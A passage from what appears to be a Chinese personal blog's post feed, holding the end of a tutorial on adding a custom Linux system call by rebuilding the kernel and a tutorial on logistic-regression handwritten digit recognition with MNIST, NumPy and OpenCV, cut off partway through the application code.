<p>这么多？？好吧，其实不一定需要全部，部分Linux发行版可能自带，可以先跳过这一步，先做后面的事情，前提是自己先做好中途出现<code>error</code>的准备！中途出现错误的话可以根据提示安装即可。</p>
<h2 id="查看自己内核版本"><a href="#查看自己内核版本" class="headerlink" title="查看自己内核版本"></a>查看自己内核版本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>我的是 5.4.0.26-generic</p>
<h2 id="下载内核"><a href="#下载内核" class="headerlink" title="下载内核"></a>下载内核</h2><p>尽量下载和自己内核相近的内核,避免版本跨度过大引起不兼容情况。下面是网址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cdn.kernel.org&#x2F;pub&#x2F;linux&#x2F;kernel</span><br></pre></td></tr></table></figure>

<p>我下载的是<code>linux-5.3.9.tar.xz</code></p>
<h2 id="解压缩内核文件"><a href="#解压缩内核文件" class="headerlink" title="解压缩内核文件"></a>解压缩内核文件</h2><p>首先将上面的内核文件移动到<code>/usr/src/</code>目录下</p>
<p>在<code>/usr/src/</code>目录下打开终端</p>
<p>解压</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo xz -d linux-5.3.9.tar.xz</span><br></pre></td></tr></table></figure>

<p>解包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -xvf linux-5.3.9.tar</span><br></pre></td></tr></table></figure>

<h2 id="加入函数"><a href="#加入函数" class="headerlink" title="加入函数"></a>加入函数</h2><p>解包完毕之后会出现一个<code>linux-5.3.9</code>文件夹，进入该文件夹的<code>kernel</code>文件夹中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd linux-5.3.9&#x2F;kernel</span><br></pre></td></tr></table></figure>

<p>编辑<code>sys.c</code>文件，在末尾加入函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_hello</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    prink(<span class="string">"hello syscall!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="添加函数声明"><a href="#添加函数声明" class="headerlink" title="添加函数声明"></a>添加函数声明</h2><p>进入<code>/usr/src/linux-5.3.9/arch/x86/include/asm</code></p>
<p>编辑 <code>syscalls.h</code>，加入我们的<code>sys_hello</code>函数：</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588224505122.png" class>

<h2 id="给我们的系统调用分配一个id"><a href="#给我们的系统调用分配一个id" class="headerlink" title="给我们的系统调用分配一个id"></a>给我们的系统调用分配一个id</h2><p>打开<code>/usr/src/linux-5.3.9/arch/x86/entry/syscalls/syscall_64.tbl</code>，</p>
<p>一定要确保不会跟已有的冲突</p>
<p>我加的是</p>
<p>548 64 hello sys_hello</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588225138576.png" class>

<h2 id="配置内核"><a href="#配置内核" class="headerlink" title="配置内核"></a>配置内核</h2><p>进入到<code>/usr/src/linux-5.3.9</code>目录下，依次执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make mrproper</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make clean</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make menuconfig</span><br></pre></td></tr></table></figure>

<p>假如执行<code>sudo make menuconfig</code>时候出现下面的错误</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588253321277.png" class>

<p>将虚拟机全屏即可（撑满屏幕）</p>
<p>然后出现该页面，直接<code>save</code>，然后<code>exit</code>。</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588253775435.png" class>

<p>然后就可以通过下面的命令编译我们的内核了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make</span><br></pre></td></tr></table></figure>

<p>该过程大概持续几个小时，反正我是放后台，然后先去睡觉的~~。</p>
<p><strong>但是！等我睡醒才发现，电脑自动休眠了！白白浪费了一个晚上的时间，所以提醒编译之前将电脑的休眠模式关闭。还有编译过程会产生大量中间文件，建议硬盘给够 40 GB</strong></p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588329524537.png" class>

<p>出现类似上面的信息就说明编译成功了。</p>
<h2 id="生成modules"><a href="#生成modules" class="headerlink" title="生成modules"></a>生成modules</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make modules</span><br></pre></td></tr></table></figure>

<p>这个过程也需要一定的时间。</p>
<h2 id="安装modules"><a href="#安装modules" class="headerlink" title="安装modules"></a>安装modules</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make modules_install</span><br></pre></td></tr></table></figure>

<h2 id="将内核安装进系统中"><a href="#将内核安装进系统中" class="headerlink" title="将内核安装进系统中"></a>将内核安装进系统中</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h2 id="重启并测试"><a href="#重启并测试" class="headerlink" title="重启并测试"></a>重启并测试</h2><p>重启过程进入高级选项</p>
<p>刚刚重启的时候按下<code>ESC</code>（网上说是<code>ESC</code>，但是我的是长按<code>Shift</code>）</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588383413241.png" class>

<p>选择高级选项，然后选择新内核</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588383460106.png" class>

<p>假如进入内核的过程出现<code>kernel panic not syncing:System is deadlocked on memory</code>错误，只需要将内存增大即可。</p>
<p>新建测试源程序<code>testMyCall.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// syscall 需要传递一个系统调用编号</span></span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">int</span> myRetutn = syscall(<span class="number">548</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"syscall return: %ld"</span>,myRetutn);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc testMyCall.c -o test</span><br><span class="line">./test</span><br><span class="line">syscall return: 1</span><br></pre></td></tr></table></figure>

<p><strong>我们发现并没有输出<code>hello syscall!</code></strong>,是因为日志输出级别问题，只需要调用<code>dmesg</code>命令即可。</p>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>命令行</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑回归-手写字符识别</title>
    <url>/2022/04/25/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-%E6%89%8B%E5%86%99%E5%AD%97%E7%AC%A6%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>逻辑回归虽然在名字里边带了逻辑，但是经常被用于分类问题，而且常和线性回归相结合，本文将利用<code>MNIST</code>数据集，完成多分类问题，带你一窥逻辑回归背后的原理。</p>
<a id="more"></a>

<h2 id="相关原理"><a href="#相关原理" class="headerlink" title="相关原理"></a>相关原理</h2><h3 id="数据集获取"><a href="#数据集获取" class="headerlink" title="数据集获取"></a>数据集获取</h3><p><a href="http://yann.lecun.com/exdb/mnist/" target="_blank" rel="noopener">下载地址</a></p>
<p>该数据集中包含了6万个训练集样本、1万个测试集样本，每个样本都是<code>28*28</code>的字符图片，标签为该字符对应的字符类别，下图为某一个样本：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425125449.png" alt></p>
<p>获取数据集以后，我们还要将图片降维，使之变为长度<code>784</code>的向量，意味着我们有<code>784</code>个特征，虽然提取特征有更好的方法，但是我们这里仍然使用线性回归的方法。</p>
<p>此外，每份样本的标签值是该样本的类别，还应该进行<a href="https://baike.baidu.com/item/%E7%8B%AC%E7%83%AD%E7%BC%96%E7%A0%81/9717350?fr=aladdin" target="_blank" rel="noopener">独热编码</a>，将其转为每个类别的概率。</p>
<h3 id="sigmoid函数"><a href="#sigmoid函数" class="headerlink" title="sigmoid函数"></a>sigmoid函数</h3><p>该函数也称为逻辑函数，函数定义如下：</p>
<p>  <img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425125914.png" alt="g(z)=\frac{1}{1+e^{-z}} "></p>
<p>函数大概长这样：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425130418.png" alt="g(z)=\frac{1}{1+e^{-z}} "></p>
<p>它很符合我们的直观感觉，在无穷大或者无穷小的时候，变化不大，要么趋于1要么趋于0，而在中间位置变化最为明显，我们也可以求得其导数：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425130720.png" alt="g&#39;(z)=g(z)(1-g(z))"></p>
<h3 id="Forward-propagation（前向传播-）"><a href="#Forward-propagation（前向传播-）" class="headerlink" title="Forward propagation（前向传播 ）"></a>Forward propagation（前向传播 ）</h3><p>该过程是从输入到输出的过程，即从图片输入到计算其每一个类别概率的过程，如果是二分类问题，那么输出则是该图片属于该类别的概率，若是多分类，那么输出的个数应该与类别数量一致，其每一个输出对应类别的概率。</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425131534.png" alt="\widehat{y}_{i}=g(z)=g\left(\mathrm{w}^{T} x+b\right)=\frac{1}{1+e^{-\mathrm{w}^{T} x-b}}"></p>
<blockquote>
<p>这里的 <code>w</code>就是我们图片每一个像素对应的权重，故长度也为784</p>
</blockquote>
<h3 id="Back-propagation-（反向传播）"><a href="#Back-propagation-（反向传播）" class="headerlink" title="Back propagation （反向传播）"></a>Back propagation （反向传播）</h3><p>反向传播指的是从根据输出，计算梯度，更新参数的过程，这里使用的仍然是梯度下降分析法。不过我们先介绍一下交叉熵的概念，这个一般用于衡量两个概率分布的距离，也可以说用来判断两个模型之间有多“像”，该函数定义如下：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425133102.png" alt></p>
<p>我们也是用该函数作为我们的损失函数。</p>
<p>该函数对<code>z</code>求导为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425135143.png" alt="\frac{\mathrm{d}L}{\mathrm{d}z}=\frac{-y_i}{g\left(z\right)}g\left(z\right)\left(1-g\left(z\right)\right)+\frac{1-y_i}{1-g\left(z\right)}g\left(z\right)\left(1-g\left(z\right)\right)=g\left(z\right)-y_i"></p>
<p>进一步地，对参数<code>w</code>求导</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425135445.png" alt="\frac{\partial L}{\partial w}=\frac{\mathrm{d} L}{\mathrm{d}z}\frac{\partial z}{\partial w}=\frac{\mathrm{d} L}{\mathrm{d}z}x=\left(g\left(z\right)-y\right)x"></p>
<p>同理，对<code>b</code>求导</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425135716.png" alt="\frac{\partial L}{\partial b}=\frac{\mathrm{d} L}{\mathrm{d}z}\frac{\partial z}{\partial b}=\frac{\mathrm{d} L}{\mathrm{d}z}=g\left(z\right)-y"></p>
<h3 id="softmax-函数"><a href="#softmax-函数" class="headerlink" title="softmax 函数"></a>softmax 函数</h3><p>由于我们的输出有多个，具体来说，输出个数<code>k</code>等于类别数，本数据集而言，有<code>10</code>个，这样就势必带来一个问题，所有的概率加起来和可能不为<code>1</code>，这显然违背常理，因此要进一步处理输出，我们使用<code>softmax</code>函数，该函数定义如下：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425140306.png" alt="softmax\left(o_j\right)=softmax\left(g\left(z_j\right)\right)=\frac{e^{o_j}}{\sum_{i=0}^{k}e^{o_i}}"></p>
<h2 id="训练代码"><a href="#训练代码" class="headerlink" title="训练代码"></a>训练代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogicTrain</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_tain</span><span class="params">(self, epoch, learning_rate)</span>:</span></span><br><span class="line">        </span><br><span class="line">        fig = plt.figure()</span><br><span class="line">        cost_ax = fig.add_subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">        cost_ax.set_title(<span class="string">"Loss change process"</span>)</span><br><span class="line">        accuracy_ax = fig.add_subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        accuracy_ax.set_title(<span class="string">"accuracy"</span>)</span><br><span class="line"></span><br><span class="line">        training_inputs, training_labels, validation_inputs, validation_labels, test_inputs, test_labels = self.load_binary_data()</span><br><span class="line">        <span class="comment"># feature_num 是 784，即每一张图片拉成一维的向量的长度</span></span><br><span class="line">        n, feature_num = training_inputs.shape</span><br><span class="line">        k = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">        accuracy_x, accuracy_y = [], []</span><br><span class="line">        w, b = self.init_parameter(feature_num, k)</span><br><span class="line"></span><br><span class="line">        cost_x, cost_y = [], []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(epoch):</span><br><span class="line">            y_hat = self.forward(training_inputs, w, b)</span><br><span class="line">            w, b = self.backward(training_inputs, w, b, training_labels, y_hat, learning_rate)</span><br><span class="line">            crs_etr = self.cross_entropy(training_labels, y_hat)</span><br><span class="line">            loss = np.sum(crs_etr) / n / k</span><br><span class="line">            print(<span class="string">' epoch = '</span>, i, <span class="string">' loss = '</span>, loss)</span><br><span class="line">            cost_x.append(i)</span><br><span class="line">            cost_y.append(loss)</span><br><span class="line">        <span class="comment"># 计算预测验证集的准确性</span></span><br><span class="line">        vl_hat = self.forward(validation_inputs, w, b)</span><br><span class="line">        vl_predict = self.softmax(vl_hat)</span><br><span class="line">        <span class="comment"># 找出概率最大的下标，即最可能的字符</span></span><br><span class="line">        predict_label = np.argmax(vl_predict, axis=<span class="number">1</span>)</span><br><span class="line">        predict_right_number = np.sum((predict_label == validation_labels).astype(np.int))</span><br><span class="line">        m = validation_labels.shape[<span class="number">0</span>]</span><br><span class="line">        accuracy = predict_right_number / m</span><br><span class="line">        print(<span class="string">'The accuracy rate is:'</span>, accuracy)</span><br><span class="line">        cost_ax.plot(cost_x, cost_y)</span><br><span class="line">        accuracy_x.append(<span class="string">'lr='</span> + str(learning_rate) + <span class="string">'&amp;epoch='</span> + str(epoch))</span><br><span class="line">        accuracy_y.append(accuracy)</span><br><span class="line">        </span><br><span class="line">        self.save_model(w, b)</span><br><span class="line">        accuracy_ax.bar(accuracy_x, accuracy_y)</span><br><span class="line">        plt.show()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_binary_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 该数据集已经将图片转为行向量  即每一张图片都被拉成一维向量了</span></span><br><span class="line">        f = gzip.open(<span class="string">'mnist.pkl.gz'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        training_data, validation_data, test_data = pickle.load(f, encoding=<span class="string">'bytes'</span>)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">        training_inputs, training_labels = training_data</span><br><span class="line">        validation_inputs, validation_labels = validation_data</span><br><span class="line">        test_inputs, test_labels = test_data</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 实际上字符识别，模型可能更关心该点像素是不是属于字符中的一部分</span></span><br><span class="line">        <span class="comment"># 因此可以将像素二值化，将灰度值信息去掉，直接 0 或者 1</span></span><br><span class="line">        training_inputs[training_inputs &lt; <span class="number">0.01</span>] = <span class="number">0</span></span><br><span class="line">        training_inputs[training_inputs &gt;= <span class="number">0.01</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        validation_inputs[validation_inputs &lt; <span class="number">0.01</span>] = <span class="number">0</span></span><br><span class="line">        validation_inputs[validation_inputs &gt;= <span class="number">0.01</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        test_inputs[test_inputs &lt; <span class="number">0.01</span>] = <span class="number">0</span></span><br><span class="line">        test_inputs[test_inputs &gt;= <span class="number">0.01</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 10 分类问题</span></span><br><span class="line">        k = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">        training_labels = self.one_hot_encoding(k, training_labels)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (training_inputs, training_labels, validation_inputs, validation_labels, test_inputs, test_labels)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">one_hot_encoding</span><span class="params">(self, k, original_label)</span>:</span></span><br><span class="line">        label = np.eye(k)[original_label].reshape(<span class="number">-1</span>, k)</span><br><span class="line">        <span class="keyword">return</span> label</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_parameter</span><span class="params">(self, n, k)</span>:</span></span><br><span class="line">        w, b = np.random.randn(n, k), np.random.randn(<span class="number">1</span>, k)</span><br><span class="line">        <span class="keyword">return</span> w, b</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x, w, b)</span>:</span></span><br><span class="line">        z = np.dot(x, w) + b</span><br><span class="line">        <span class="keyword">return</span> self.sigmoid(z)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span><span class="params">(self, X)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.0</span> / (<span class="number">1.0</span> + np.exp(-X))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backward</span><span class="params">(self, x, w, b, y, y_hat, l_rate)</span>:</span></span><br><span class="line">        m = x.shape[<span class="number">0</span>]</span><br><span class="line">        dw = <span class="number">1.0</span> / m * np.dot(x.T, y_hat - y)</span><br><span class="line">        db = <span class="number">1.0</span> / m * np.sum(y_hat - y)</span><br><span class="line">        w = w - l_rate * dw</span><br><span class="line">        b = b - l_rate * db</span><br><span class="line">        <span class="keyword">return</span> w, b</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cross_entropy</span><span class="params">(self, y, y_hat)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> -(y * np.log(y_hat + <span class="number">1e-10</span>) + (<span class="number">1</span> - y) * np.log(<span class="number">1</span> - y_hat + <span class="number">1e-10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">softmax</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x_exp = np.exp(x)</span><br><span class="line">        partition = np.sum(x_exp, axis=<span class="number">1</span>).reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x_exp / partition</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_model</span><span class="params">(self, w, b)</span>:</span></span><br><span class="line">        model = np.vstack((w, b))</span><br><span class="line">        np.save(<span class="string">'params-binarization.npy'</span>, model)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    l = LogicTrain()</span><br><span class="line">    l.start_tain(<span class="number">500</span>, <span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>

<p>训练结果：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425143942.png" alt></p>
<h2 id="应用模型"><a href="#应用模型" class="headerlink" title="应用模型"></a>应用模型</h2><p>训练结束以后，我们将学习得到的参数<code>w</code>和<code>b</code>保存，接下来我们就可以测试我们模型的性能了，使用之前先将参数导入，然后再使用，这里借助<code>OpenCV</code>和<code>PyQt</code>，主要是获取鼠标的轨迹，然后转为图片，并放到我们的模型中计算每一个类别的概率，再选择最大的作为输出即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QMessageBox</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogicApplication</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 初始化全局参数</span></span><br><span class="line">        self.drawing = <span class="literal">False</span></span><br><span class="line">        self.ix, self.iy = <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">        self.image = np.zeros((<span class="number">512</span>, <span class="number">512</span>, <span class="number">3</span>), np.uint8)</span><br><span class="line"></span><br><span class="line">        window = cv2.namedWindow(<span class="string">'write your number'</span>)</span><br><span class="line">        cv2.setMouseCallback(<span class="string">'write your number'</span>, self.draw_circle)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 大小是 785 * 10</span></span><br><span class="line">        param = self.load_model()</span><br><span class="line"></span><br><span class="line">        w, b = param[<span class="number">0</span>:<span class="number">784</span>, :], param[<span class="number">-1</span>, :]</span><br><span class="line"></span><br><span class="line">        ENTER, SPACE, ESC = <span class="number">13</span>, <span class="number">32</span>, <span class="number">27</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            cv2.imshow(<span class="string">'write your number'</span>, self.image)</span><br><span class="line">            k = cv2.waitKey(<span class="number">50</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">            <span class="comment"># 按下 enter 键，识别当前画布上的数字</span></span><br><span class="line">            <span class="keyword">if</span> k == ENTER:</span><br><span class="line">                print(<span class="string">'enter'</span>)</span><br><span class="line"></span><br><span class="line">                img_new = cv2.cvtColor(self.image, cv2.COLOR_BGR2GRAY)</span><br><span class="line">                cv2.imwrite(<span class="string">"write.jpg"</span>, self.image)</span><br><span class="line">                x = self.handle_img(self.image)</span><br><span class="line">                predict_y = self.softmax(np.dot(x.reshape(<span class="number">1</span>, <span class="number">-1</span>), w) + b)</span><br><span class="line">                <span class="comment"># 找出概率最大的下标，即最可能的字符</span></span><br><span class="line">                predict_label = np.argmax(predict_y, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                self.show_message(predict_label, predict_y)</span><br><span class="line"></span><br><span class="line">                print(<span class="string">'you wirte : '</span>, predict_label)</span><br><span class="line">                print(<span class="string">'Each probability is '</span>.join(str(i) <span class="keyword">for</span> i <span class="keyword">in</span> np.round(predict_y, <span class="number">2</span>)))</span><br><span class="line">            <span class="comment"># 按下 space 键，清空当前图像，还原成黑色画布</span></span><br><span class="line">            <span class="keyword">elif</span> k == SPACE:</span><br><span class="line">                self.image = np.zeros((<span class="number">512</span>, <span class="number">512</span>, <span class="number">3</span>), np.uint8)  <span class="comment"># 清空</span></span><br><span class="line">            <span class="comment"># 按下 “ESC” 键，退出程序</span></span><br><span class="line">            <span class="keyword">elif</span> k == ESC:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        cv2.destroyWindow(<span class="string">'write your number'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_model</span><span class="params">(self)</span>:</span></span><br><span class="line">        param = np.load(<span class="string">'params-binarization.npy'</span>)</span><br><span class="line">        <span class="keyword">return</span> param</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_img</span><span class="params">(self, img)</span>:</span></span><br><span class="line">        <span class="comment"># 将图像等比例缩小至28x28大小</span></span><br><span class="line">        img = cv2.resize(img, (<span class="number">28</span>, <span class="number">28</span>))</span><br><span class="line">        <span class="comment"># 转化为灰度图</span></span><br><span class="line">        im_arr = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line">        <span class="comment"># 把图像矩阵转化为一维向量</span></span><br><span class="line">        x = im_arr.reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        x[x &lt; <span class="number">128</span>] = <span class="number">0</span></span><br><span class="line">        x[x &gt;= <span class="number">128</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 鼠标手写数字</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw_circle</span><span class="params">(self, event, x, y, s, a)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> event == cv2.EVENT_LBUTTONDOWN:</span><br><span class="line">            self.drawing = <span class="literal">True</span></span><br><span class="line">            self.ix, self.iy = x, y</span><br><span class="line">        <span class="keyword">elif</span> event == cv2.EVENT_MOUSEMOVE:</span><br><span class="line">            <span class="keyword">if</span> self.drawing == <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># 圆半径（笔画粗细）设置为25是为了和mnist数据集中的数字尽可能粗细相似</span></span><br><span class="line">                cv2.circle(self.image, (x, y), <span class="number">25</span>, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">-1</span>)  <span class="comment"># 画笔颜色为白色</span></span><br><span class="line">        <span class="keyword">elif</span> event == cv2.EVENT_LBUTTONUP:</span><br><span class="line">            self.drawing = <span class="literal">False</span></span><br><span class="line">            cv2.circle(self.image, (x, y), <span class="number">25</span>, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">softmax</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x_exp = np.exp(x)</span><br><span class="line">        partition = np.sum(x_exp, axis=<span class="number">1</span>).reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x_exp / partition</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_message</span><span class="params">(self, predict_label, predict_y)</span>:</span></span><br><span class="line">        message_body = <span class="string">"预测您输入的字符为："</span> + str(predict_label) + <span class="string">"，其中，各个字符的预测概率为：\n"</span></span><br><span class="line">        <span class="keyword">for</span> index, probability <span class="keyword">in</span> enumerate(predict_y[<span class="number">0</span>]):</span><br><span class="line">            message_body += str(index) + <span class="string">"："</span>+str(round(probability, <span class="number">3</span>)) + <span class="string">"，"</span></span><br><span class="line">        message_body += <span class="string">"\n结果仅供参考"</span></span><br><span class="line"></span><br><span class="line">        messageBox = QMessageBox()</span><br><span class="line">        messageBox.setWindowTitle(<span class="string">'预测结果'</span>)</span><br><span class="line">        messageBox.setText(message_body)</span><br><span class="line">        messageBox.setStandardButtons(QMessageBox.Yes | QMessageBox.No)</span><br><span class="line">        buttonY = messageBox.button(QMessageBox.Yes)</span><br><span class="line">        buttonY.setText(<span class="string">'好的（并清空笔记）'</span>)</span><br><span class="line">        buttonN = messageBox.button(QMessageBox.No)</span><br><span class="line">        buttonN.setText(<span 